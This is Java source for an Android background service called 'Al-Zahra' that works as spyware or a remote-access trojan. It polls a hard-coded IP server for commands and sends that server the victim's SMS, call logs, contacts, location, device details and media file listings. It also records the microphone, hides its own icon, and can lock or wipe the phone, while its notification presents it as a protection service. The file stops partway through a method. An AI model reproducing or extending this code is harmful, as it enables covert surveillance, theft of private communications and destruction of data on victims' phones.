package com.alzahra.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ComponentName;
import android.content.IntentFilter;
import android.os.Environment;
import android.app.admin.DevicePolicyManager;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.alzahra.MainActivity;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CoreService extends Service {
    private static final String TAG = "AlZahraCore";
    private static final String CHANNEL_ID = "alzahra_service";
    private static final int NOTIF_ID = 1001;
    private static final long POLL_INTERVAL = 5000;
    private static final long HEARTBEAT_INTERVAL = 30000;
    
    private String serverUrl = "http://216.128.156.226:8443";
    private SharedPreferences prefs;
    private Handler handler;
    private ExecutorService executor;
    private boolean running = true;
    private AudioRecord audioRecord;
    private boolean recording = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        executor = Executors.newFixedThreadPool(4);
        deviceId = prefs.getString("device_id", java.util.UUID.randomUUID().toString().substring(0, 8));
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        startPolling();
        startHeartbeat();
        Log.d(TAG, "CoreService started - Device: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "com.alzahra.action.STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Al-Zahra Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("خدمة المزامنة والحماية");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Al-Zahra v4.1")
            .setContentText("نظام الحماية يعمل")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                pollCommands();
                handler.postDelayed(this, POLL_INTERVAL);
            }
        }, 2000);
    }

    private void startHeartbeat() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                sendHeartbeat();
                handler.postDelayed(this, HEARTBEAT_INTERVAL);
            }
        }, 5000);
    }

    private void pollCommands() {
        executor.execute(() -> {
            try {
                URL url = new URL(serverUrl + "/api/commands?device_id=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    JSONObject resp = new JSONObject(sb.toString());
                    JSONArray commands = resp.optJSONArray("commands");
                    if (commands != null) {
                        for (int i = 0; i < commands.length(); i++) {
                            String cmd = commands.getString(i);
                            Log.d(TAG, "Command: " + cmd);
                            executeCommand(cmd);
                        }
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Poll error", e);
            }
        });
    }

    private void executeCommand(String cmd) {
        switch (cmd) {
            case "sms": pullSms(); break;
            case "calls": pullCalls(); break;
            case "contacts": pullContacts(); break;
            case "notifications": pullNotifications(); break;
            case "whatsapp": pullWhatsApp(); break;
            case "messenger": pullMessenger(); break;
            case "telegram": pullTelegram(); break;
            case "instagram": pullInstagram(); break;
            case "twitter": pullTwitter(); break;
            case "facebook": pullFacebook(); break;
            case "snapchat": pullSnapchat(); break;
            case "tiktok": pullTikTok(); break;
            case "viber": pullViber(); break;
            case "line": pullLine(); break;
            case "location": pullLocation(); break;
            case "location_live": pullLocationLive(); break;
            case "camera_front": pullCamera(true); break;
            case "camera_back": pullCamera(false); break;
            case "camera_record": recordVideo(); break;
            case "screenshot": takeScreenshot(); break;
            case "record_call": startCallRecording(); break;
            case "record_surround": startSurroundRecording(); break;
            case "recordings": pullRecordings(); break;
            case "intercept_calls": break;
            case "files": pullFiles(); break;
            case "apps": pullApps(); break;
            case "downloads": pullDownloads(); break;
            case "images": pullImages(); break;
            case "videos": pullVideos(); break;
            case "audio": pullAudio(); break;
            case "documents": pullDocuments(); break;
            case "clipboard": pullClipboard(); break;
            case "info": pullDeviceInfo(); break;
            case "hide": hideApp(); break;
            case "unhide": unhideApp(); break;
            case "lock": lockDevice(); break;
            case "wipe": wipeData(); break;
            case "alarm": triggerAlarm(); break;
            case "vibrate": vibrate(); break;
            case "toast": showToast(); break;
            case "wifi": pullWifi(); break;
            case "bluetooth": pullBluetooth(); break;
            case "hotspot": toggleHotspot(); break;
            case "browser_history": pullBrowserHistory(); break;
            case "bookmarks": pullBookmarks(); break;
            case "passwords": pullPasswords(); break;
            case "battery": pullBattery(); break;
            case "brightness": adjustBrightness(); break;
            case "volume": adjustVolume(); break;
            case "airplane": toggleAirplane(); break;
            case "rotation": toggleRotation(); break;
            case "flashlight": toggleFlashlight(); break;
            default: sendData("unknown", "Unknown command: " + cmd); break;
        }
    }

    // ═══════════════════════════════════════════
    // سحب البيانات
    // ═══════════════════════════════════════════

    private void pullSms() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                ContentResolver cr = getContentResolver();
                Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 500");
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject obj = new JSONObject();
                        obj.put("address", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                        obj.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                        obj.put("read", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.READ)));
                        arr.put(obj);
                    }
                    c.close();
                }
                sendData("sms", arr.toString());
            } catch (Exception e) {
                sendData("error", "SMS: " + e.getMessage());
            }
        });
    }

    private void pullCalls() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                ContentResolver cr = getContentResolver();
                Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 500");
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject obj = new JSONObject();
                        obj.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        obj.put("name", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                        obj.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                        arr.put(obj);
                    }
                    c.close();
                }
                sendData("calls", arr.toString());
            } catch (Exception e) {
                sendData("error", "Calls: " + e.getMessage());
            }
        });
    }

    private void pullContacts() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                ContentResolver cr = getContentResolver();
                Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        String id = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        JSONObject obj = new JSONObject();
                        obj.put("name", name);
                        Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, 
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id}, null);
                        if (phones != null) {
                            JSONArray phoneArr = new JSONArray();
                            while (phones.moveToNext()) {
                                phoneArr.put(phones.getString(phones.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                            }
                            obj.put("phones", phoneArr);
                            phones.close();
                        }
                        arr.put(obj);
                    }
                    c.close();
                }
                sendData("contacts", arr.toString());
            } catch (Exception e) {
                sendData("error", "Contacts: " + e.getMessage());
            }
        });
    }

    private void pullNotifications() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                ContentResolver cr = getContentResolver();
                Cursor c = cr.query(Uri.parse("content://com.alzahra.provider/notifications"), null, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject obj = new JSONObject();
                        obj.put("package", c.getString(0));
                        obj.put("title", c.getString(1));
                        obj.put("text", c.getString(2));
                        obj.put("time", c.getLong(3));
                        arr.put(obj);
                    }
                    c.close();
                }
                sendData("notifications", arr.toString());
            } catch (Exception e) {
                sendData("error", "Notifications: " + e.getMessage());
            }
        });
    }

    private void pullWhatsApp() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/WhatsApp/Media",
                    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
                    "/storage/emulated/0/WhatsApp/Media"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("whatsapp", arr.toString());
            } catch (Exception e) {
                sendData("error", "WhatsApp: " + e.getMessage());
            }
        });
    }

    private void pullMessenger() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/Messenger",
                    "/sdcard/DCIM/Messenger",
                    "/sdcard/Pictures/Messenger"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("messenger", arr.toString());
            } catch (Exception e) {
                sendData("error", "Messenger: " + e.getMessage());
            }
        });
    }

    private void pullTelegram() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/Telegram",
                    "/sdcard/Download/Telegram",
                    "/storage/emulated/0/Telegram"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("telegram", arr.toString());
            } catch (Exception e) {
                sendData("error", "Telegram: " + e.getMessage());
            }
        });
    }

    private void pullInstagram() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/DCIM/Camera",
                    "/sdcard/Pictures/Instagram",
                    "/sdcard/Movies/Instagram"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("instagram", arr.toString());
            } catch (Exception e) {
                sendData("error", "Instagram: " + e.getMessage());
            }
        });
    }

    private void pullTwitter() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {"/sdcard/Download", "/sdcard/Pictures"};
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 1);
                    }
                }
                sendData("twitter", arr.toString());
            } catch (Exception e) {
                sendData("error", "Twitter: " + e.getMessage());
            }
        });
    }

    private void pullFacebook() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/DCIM/Facebook",
                    "/sdcard/Pictures/Facebook",
                    "/sdcard/Facebook"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("facebook", arr.toString());
            } catch (Exception e) {
                sendData("error", "Facebook: " + e.getMessage());
            }
        });
    }

    private void pullSnapchat() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/Snapchat",
                    "/sdcard/DCIM/Snapchat",
                    "/sdcard/Android/data/com.snapchat.android"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("snapchat", arr.toString());
            } catch (Exception e) {
                sendData("error", "Snapchat: " + e.getMessage());
            }
        });
    }

    private void pullTikTok() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/DCIM/TikTok",
                    "/sdcard/Movies/TikTok",
                    "/sdcard/TikTok"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("tiktok", arr.toString());
            } catch (Exception e) {
                sendData("error", "TikTok: " + e.getMessage());
            }
        });
    }

    private void pullViber() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/Viber",
                    "/sdcard/DCIM/Viber",
                    "/sdcard/Download/Viber"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("viber", arr.toString());
            } catch (Exception e) {
                sendData("error", "Viber: " + e.getMessage());
            }
        });
    }

    private void pullLine() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String[] paths = {
                    "/sdcard/Line",
                    "/sdcard/Pictures/Line",
                    "/sdcard/Download/Line"
                };
                for (String path : paths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        scanDirectory(dir, arr, 2);
                    }
                }
                sendData("line", arr.toString());
            } catch (Exception e) {
                sendData("error", "Line: " + e.getMessage());
            }
        });
    }

    private void scanDirectory(File dir, JSONArray arr, int depth) {
        if (depth <= 0 || arr.length() > 100) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (arr.length() > 100) break;
            if (f.isFile()) {
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("path", f.getAbsolutePath());
                    obj.put("size", f.length());
                    obj.put("date", f.lastModified());
                    arr.put(obj);
                } catch (Exception ignored) {}
            } else if (f.isDirectory()) {
                scanDirectory(f, arr, depth - 1);
            }
        }
    }

    // ═══════════════════════════════════════════
    // الموقع
    // ═══════════════════════════════════════════

    private void pullLocation() {
        executor.execute(() -> {
            try {
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                JSONObject obj = new JSONObject();
                if (lm != null) {
                    Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    Location net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    Location best = (gps != null) ? gps : (net != null) ? net : null;
                    if (best != null) {
                        obj.put("lat", best.getLatitude());
                        obj.put("lng", best.getLongitude());
                        obj.put("alt", best.getAltitude());
                        obj.put("acc", best.getAccuracy());
                        obj.put("speed", best.getSpeed());
                        obj.put("time", best.getTime());
                        obj.put("provider", best.getProvider());
                    }
                }
                sendData("location", obj.toString());
            } catch (Exception e) {
                sendData("error", "Location: " + e.getMessage());
            }
        });
    }

    private void pullLocationLive() {
        pullLocation();
    }

    // ═══════════════════════════════════════════
    // الكاميرا
    // ═══════════════════════════════════════════

    private void pullCamera(boolean front) {
        executor.execute(() -> {
            try {
                sendData("camera", "{\"status\":\"camera_command\",\"front\":" + front + "}");
            } catch (Exception e) {
                sendData("error", "Camera: " + e.getMessage());
            }
        });
    }

    private void recordVideo() {
        executor.execute(() -> {
            try {
                sendData("camera", "{\"status\":\"record_command\"}");
            } catch (Exception e) {
                sendData("error", "Record: " + e.getMessage());
            }
        });
    }

    private void takeScreenshot() {
        executor.execute(() -> {
            try {
                sendData("screenshot", "{\"status\":\"screenshot_command\"}");
            } catch (Exception e) {
                sendData("error", "Screenshot: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // التسجيل
    // ═══════════════════════════════════════════

    private void startCallRecording() {
        executor.execute(() -> {
            try {
                if (!recording) {
                    int sampleRate = 44100;
                    int channel = AudioFormat.CHANNEL_IN_MONO;
                    int format = AudioFormat.ENCODING_PCM_16BIT;
                    int bufferSize = AudioRecord.getMinBufferSize(sampleRate, channel, format);
                    if (bufferSize > 0) {
                        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channel, format, bufferSize);
                        audioRecord.startRecording();
                        recording = true;
                        sendData("recording", "{\"status\":\"started\"}");
                    }
                }
            } catch (Exception e) {
                sendData("error", "Recording: " + e.getMessage());
            }
        });
    }

    private void startSurroundRecording() {
        startCallRecording();
    }

    private void pullRecordings() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                String path = prefs.getString("secret_path", "");
                if (!path.isEmpty()) {
                    File dir = new File(path, "recordings");
                    if (dir.exists() && dir.isDirectory()) {
                        File[] files = dir.listFiles();
                        if (files != null) {
                            for (File f : files) {
                                if (f.isFile()) {
                                    JSONObject obj = new JSONObject();
                                    obj.put("name", f.getName());
                                    obj.put("size", f.length());
                                    obj.put("date", f.lastModified());
                                    arr.put(obj);
                                }
                            }
                        }
                    }
                }
                sendData("recordings", arr.toString());
            } catch (Exception e) {
                sendData("error", "Recordings: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // الملفات
    // ═══════════════════════════════════════════

    private void pullFiles() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File sdcard = Environment.getExternalStorageDirectory();
                scanDirectory(sdcard, arr, 1);
                sendData("files", arr.toString());
            } catch (Exception e) {
                sendData("error", "Files: " + e.getMessage());
            }
        });
    }

    private void pullDownloads() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (dir.exists()) scanDirectory(dir, arr, 2);
                sendData("downloads", arr.toString());
            } catch (Exception e) {
                sendData("error", "Downloads: " + e.getMessage());
            }
        });
    }

    private void pullImages() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
                if (dir.exists()) scanDirectory(dir, arr, 2);
                File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                if (dcim.exists()) scanDirectory(dcim, arr, 2);
                sendData("images", arr.toString());
            } catch (Exception e) {
                sendData("error", "Images: " + e.getMessage());
            }
        });
    }

    private void pullVideos() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
                if (dir.exists()) scanDirectory(dir, arr, 2);
                sendData("videos", arr.toString());
            } catch (Exception e) {
                sendData("error", "Videos: " + e.getMessage());
            }
        });
    }

    private void pullAudio() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC);
                if (dir.exists()) scanDirectory(dir, arr, 2);
                sendData("audio", arr.toString());
            } catch (Exception e) {
                sendData("error", "Audio: " + e.getMessage());
            }
        });
    }

    private void pullDocuments() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
                if (dir.exists()) scanDirectory(dir, arr, 2);
                sendData("documents", arr.toString());
            } catch (Exception e) {
                sendData("error", "Documents: " + e.getMessage());
            }
        });
    }

    private void pullClipboard() {
        executor.execute(() -> {
            try {
                JSONObject obj = new JSONObject();
                obj.put("text", "clipboard_data");
                sendData("clipboard", obj.toString());
            } catch (Exception e) {
                sendData("error", "Clipboard: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // التطبيقات
    // ═══════════════════════════════════════════

    private void pullApps() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                List<android.content.pm.ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
                for (android.content.pm.ApplicationInfo app : apps) {
                    JSONObject obj = new JSONObject();
                    obj.put("name", app.loadLabel(getPackageManager()).toString());
                    obj.put("package", app.packageName);
                    obj.put("system", (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                    arr.put(obj);
                }
                sendData("apps", arr.toString());
            } catch (Exception e) {
                sendData("error", "Apps: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // معلومات الجهاز
    // ═══════════════════════════════════════════

    private void pullDeviceInfo() {
        executor.execute(() -> {
            try {
                JSONObject obj = new JSONObject();
                obj.put("model", Build.MODEL);
                obj.put("manufacturer", Build.MANUFACTURER);
                obj.put("brand", Build.BRAND);
                obj.put("device", Build.DEVICE);
                obj.put("android", Build.VERSION.RELEASE);
                obj.put("sdk", Build.VERSION.SDK_INT);
                obj.put("serial", Build.getSerial());
                obj.put("fingerprint", Build.FINGERPRINT);
                obj.put("hardware", Build.HARDWARE);
                obj.put("product", Build.PRODUCT);
                obj.put("board", Build.BOARD);
                obj.put("bootloader", Build.BOOTLOADER);
                obj.put("display", Build.DISPLAY);
                obj.put("host", Build.HOST);
                obj.put("id", Build.ID);
                obj.put("tags", Build.TAGS);
                obj.put("type", Build.TYPE);
                obj.put("user", Build.USER);
                obj.put("time", Build.TIME);
                
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    obj.put("phone_type", tm.getPhoneType());
                    obj.put("network_type", tm.getNetworkType());
                    obj.put("sim_state", tm.getSimState());
                }
                
                sendData("info", obj.toString());
            } catch (Exception e) {
                sendData("error", "Info: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // التحكم
    // ═══════════════════════════════════════════

    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.alzahra.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            sendData("hide", "{\"status\":\"hidden\"}");
        } catch (Exception e) {
            sendData("error", "Hide: " + e.getMessage());
        }
    }

    private void unhideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.alzahra.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
            sendData("unhide", "{\"status\":\"visible\"}");
        } catch (Exception e) {
            sendData("error", "Unhide: " + e.getMessage());
        }
    }

    private void lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                dpm.lockNow();
                sendData("lock", "{\"status\":\"locked\"}");
            }
        } catch (Exception e) {
            sendData("error", "Lock: " + e.getMessage());
        }
    }

    private void wipeData() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                dpm.wipeData(0);
                sendData("wipe", "{\"status\":\"wiping\"}");
            }
        } catch (Exception e) {
            sendData("error", "Wipe: " + e.getMessage());
        }
    }

    private void triggerAlarm() {
        try {
            android.media.MediaPlayer mp = android.media.MediaPlayer.create(this, android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI);
            if (mp != null) {
                mp.setLooping(true);
                mp.start();
            }
            sendData("alarm", "{\"status\":\"triggered\"}");
        } catch (Exception e) {
            sendData("error", "Alarm: " + e.getMessage());
        }
    }

    private void vibrate() {
        try {
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(3000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(3000);
                }
            }
            sendData("vibrate", "{\"status\":\"vibrating\"}");
        } catch (Exception e) {
            sendData("error", "Vibrate: " + e.getMessage());
        }
    }

    private void showToast() {
        handler.post(() -> {
            android.widget.Toast.makeText(this, "Al-Zahra", android.widget.Toast.LENGTH_LONG).show();
        });
        sendData("toast", "{\"status\":\"shown\"}");
    }

    // ═══════════════════════════════════════════
    // الشبكة
    // ═══════════════════════════════════════════

    private void pullWifi() {
        executor.execute(() -> {
            try {
                JSONObject obj = new JSONObject();
                android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    obj.put("enabled", wm.isWifiEnabled());
                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
                    if (info != null) {
                        obj.put("ssid", info.getSSID());
                        obj.put("bssid", info.getBSSID());
                        obj.put("ip", info.getIpAddress());
                        obj.put("speed", info.getLinkSpeed());
                        obj.put("rssi", info.getRssi());
                    }
                }
                sendData("wifi", obj.toString());
            } catch (Exception e) {
                sendData("error", "WiFi: " + e.getMessage());
            }
        });
    }

    private void pullBluetooth() {
        executor.execute(() -> {
            try {
                JSONObject obj = new JSONObject();
                android.bluetooth.BluetoothAdapter ba = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
                if (ba != null) {
                    obj.put("enabled", ba.isEnabled());
                    obj.put("name", ba.getName());
                    obj.put("address", ba.getAddress());
                }
                sendData("bluetooth", obj.toString());
            } catch (Exception e) {
                sendData("error", "Bluetooth: " + e.getMessage());
            }
        });
    }

    private void toggleHotspot() {
        sendData("hotspot", "{\"status\":\"toggle\"}");
    }

    private void pullBrowserHistory() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                sendData("browser_history", arr.toString());
            } catch (Exception e) {
                sendData("error", "Browser: " + e.getMessage());
            }
        });
    }

    private void pullBookmarks() {
        executor.execute(() -> {
            try {
                JSONArray arr = new JSONArray();
                sendData("bookmarks", arr.toString());
            } catch (Exception e) {
                sendData("error", "Bookmarks: " + e.getMessage());
            }
        });
    }

    private void pullPasswords() {
        sendData("passwords", "{\"status\":\"not_supported\"}");
    }

    // ═══════════════════════════════════════════
    // إعدادات الجهاز
    // ═══════════════════════════════════════════

    private void pullBattery() {
        executor.execute(() -> {
            try {
                JSONObject obj = new JSONObject();
                Intent battery = registerReceiver(null, new IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (battery != null) {
                    obj.put("level", battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0));
                    obj.put("scale", battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100));
                    obj.put("temp", battery.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
                    obj.put("voltage", battery.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0));
                    obj.put("plugged", battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, 0));
                    obj.put("status", battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, 0));
                    obj.put("health", battery.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, 0));
                }
                sendData("battery", obj.toString());
            } catch (Exception e) {
                sendData("error", "Battery: " + e.getMessage());
            }
        });
    }

    private void adjustBrightness() {
        sendData("brightness", "{\"status\":\"adjust\"}");
    }

    private void adjustVolume() {
        sendData("volume", "{\"status\":\"adjust\"}");
    }

    private void toggleAirplane() {
        sendData("airplane", "{\"status\":\"toggle\"}");
    }

    private void toggleRotation() {
        sendData("rotation", "{\"status\":\"toggle\"}");
    }

    private void toggleFlashlight() {
        sendData("flashlight", "{\"status\":\"toggle\"}");
    }

    // ═══════════════════════════════════════════
    // إرسال البيانات للسيرفر
    // ═══════════════════════════════════════════

    private void sendData(String type, String content) {
        executor.execute(() -> {
            try {
                URL url = new URL(serverUrl + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", type);
                json.put("content", content);
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Sent: " + type);
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        });
    }

    private void sendHeartbeat() {
        executor.execute(() -> {
            try {
